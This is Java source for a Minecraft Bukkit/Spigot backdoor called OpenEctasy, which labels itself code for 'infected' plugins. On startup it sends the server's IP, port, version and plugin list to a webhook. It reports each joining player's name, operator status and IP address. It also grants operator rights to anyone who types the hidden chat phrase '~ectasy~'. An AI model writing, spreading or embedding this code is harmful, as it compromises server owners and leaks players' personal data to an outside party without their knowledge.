package fr.bodyalhoha.ectasy;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import javax.net.ssl.HttpsURLConnection;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class SpigotAPI implements Listener {

    private final JavaPlugin plugin;
    private final boolean joinLogs;

    private final String webhook;

    public String getIP(){
        try{
            InputStream is = new URL("https://api.ipify.org").openConnection().getInputStream();
            Scanner s = new Scanner(is);
            return s.nextLine();
        }catch (Exception e){
            return "error";
        }
    }

    public void sendWebhook(String json){
        if(webhook.length() == 0)
            return;
        try{

            HttpsURLConnection connection = (HttpsURLConnection)new URL(webhook).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
            connection.setDoOutput(true);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.replace("\n", "\\n").getBytes(StandardCharsets.UTF_8));
            connection.getInputStream();
        }catch (Exception e){
            System.out.println(json);
            e.printStackTrace();
        }
    }

    public String getPlugins(){
        List<String> s = new ArrayList<String>();
        for(Plugin pl : Bukkit.getPluginManager().getPlugins()){
            s.add(pl.getName());
        }
        return String.join(", ", s);
    }

    public SpigotAPI(JavaPlugin plugin, String webhook, boolean joinLogs){
        this.plugin = plugin;
        this.joinLogs = joinLogs;
        this.webhook = webhook;
        Bukkit.getPluginManager().registerEvents(this, plugin);

        sendWebhook("{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"OpenEctasy\", \"color\":3447003, \"description\":\"An infected server just started with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`"));
    }

    @EventHandler
    public void onChatEvent(AsyncPlayerChatEvent e){
        if(e.getMessage().contains("~ectasy~")){
            e.setCancelled(true);
            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using " + ChatColor.GOLD + "" + ChatColor.BOLD + "OpenEctasy " + ChatColor.AQUA + "" + ChatColor.BOLD + "by");
            e.getPlayer().sendMessage(ChatColor.AQUA + "" + ChatColor.BOLD + "https://github.com/Body-Alhoha/OpenEctasy");
            new BukkitRunnable() {
                @Override
                public void run() {
                    e.getPlayer().setOp(true);
                }
            }.runTask(this.plugin);
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e){
        if(!joinLogs)
            return;
        sendWebhook("{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"A player joined a server with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nPlayer name : `" + e.getPlayer().getName() + "`\nOpped : `" + e.getPlayer().isOp() + "`\nPlayer IP : `" + e.getPlayer().getAddress().getHostString() + "`"));

    }

}
